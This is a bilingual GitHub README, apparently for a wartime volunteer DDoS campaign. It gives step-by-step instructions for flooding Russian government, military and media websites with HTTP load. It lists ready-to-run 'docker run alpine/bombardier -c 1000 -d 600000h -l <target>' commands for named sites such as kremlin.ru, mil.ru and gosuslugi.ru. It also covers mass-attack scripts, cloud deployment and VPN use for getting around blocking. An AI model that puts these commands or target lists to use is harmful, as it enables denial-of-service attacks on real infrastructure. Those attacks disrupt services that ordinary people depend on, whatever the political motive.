# bombardier

Fight against propoganda

## CLOUD way :

### If you have kubertnetes cluster `./run_all_kuber.sh`

### GCP for not technical people (easiest)
https://www.notion.so/baaton/atack-php-d533b09a39a84c6db8007049627d03c6

### GCP for technical people
https://github.com/dotiful/bombardier/tree/main/gcp

### AWS with ec2 autoscaling
https://github.com/dotiful/bombardier/tree/main/aws

### Azure 
https://github.com/dotiful/bombardier/tree/main/azure

### Digital Ocean
[Kubernetes Docs](docs/digital_ocean_kubernetes.md) 

### Free russian VPN for Cloud VMs
[Setup instruction](docs/vpn_for_cloud_vms.md)


# Docker way
For a lot of resources or closed for Ukraine so please use Cloud way if cloud unavailable use VPN, otherwise it is not really work now.  
## Инструкция для пользователей Windows и Mac:

1. Установить Docker: https://www.docker.com/products/docker-desktop (Для Mac Пожалуйста, скачайте версию для правильного чипа)
2. Запустить докер и убедиться, что Docker Started
3. Зайти сюда https://github.com/dotiful/bombardier/blob/main/README.md
4. Для лучшего результата используйте ВПН and :
    - Psiphon: https://psiphon.ca/ (free)
    - Secure VPN: https://www.securevpn.com/ (free)
    - SurfShark: https://surfshark.com/ (paid)
    - Clear VPN: https://clearvpn.com/ (free)
    - Nord VPN: https://nordvpn.com/ (paid)
5. Запустить все цели из `resources.txt` для Windows в проводнике открываем `run_all_windows.bat` для Linux/Mac `./run_all_docker.sh` для целей из `resources.txt` (или `./run_all_docker.sh файл-с-целями`)
6. Для выполнения с конкретными целями - Скопировать скрипт (например `docker run -d --rm alpine/bombardier -c 1000 -d 60000h -l http://kremlin.ru`) и нажать энтер
7. Убедиться, что процесс пошёл
8. Ждать падения рашки

## Instruction for Windows and Mac:

1. Install Docker: https://www.docker.com/products/docker-desktop (For Mac please download the version for the correct chip)
2. Launch Docker and make sure that Docker is running
3. Navigate to https://github.com/dotiful/bombardier/blob/main/README.md
4. For best result use a VPN :
    - Psiphon: https://psiphon.ca/ (free)
    - Secure VPN: https://www.securevpn.com/ (free)
    - SurfShark: https://surfshark.com/ (paid)
    - Clear VPN: https://clearvpn.com/ (free)
    - Nord VPN: https://nordvpn.com/ (paid)
5. Use Windows Command Prompt or the Mac/Linux Terminal and launch as an admin.
6. Attack all targets from resources.txt for Windows - `run_all_windows.bat` for Linux/Mac `./run_all_docker.sh ` for `resources.txt` (or `./run_all_docker.sh your_aim_file`)
7. If you want select aims manually: `docker run -d --rm alpine/bombardier -c 1000 -d 60000h -l https://mid.ru` 
   (Open as many separate CMD consoles as many instances you are going to launch (each line – one script))
8. Make sure that the process started
9. Wait 'till russia fall


### Examples
`docker run -d --rm alpine/bombardier -c 1000 -d 600000h -l http://kremlin.ru`  
`docker run -d --rm alpine/bombardier -c 1000 -d 600000h -l https://mil.ru`  
`docker run -d --rm alpine/bombardier -c 1000 -d 600000h -l http://www.scrf.gov.ru`  
`docker run -d --rm alpine/bombardier -c 1000 -d 600000h -l https://ach.gov.ru`  
`docker run -d --rm alpine/bombardier -c 1000 -d 600000h -l https://epp.genproc.gov.ru`  
`docker run -d --rm alpine/bombardier -c 1000 -d 600000h -l https://www.gosuslugi.ru`  
`docker run -d --rm alpine/bombardier -c 1000 -d 600000h -l https://www.1tv.ru`  
`docker run -d --rm alpine/bombardier -c 1000 -d 600000h -l https://mid.ru`

### there are a lot of scripts for local usage
for unix  https://github.com/dotiful/bombardier/blob/main/run_all_docker.sh
for winodws https://github.com/dotiful/bombardier/blob/main/run_all_windows.bat
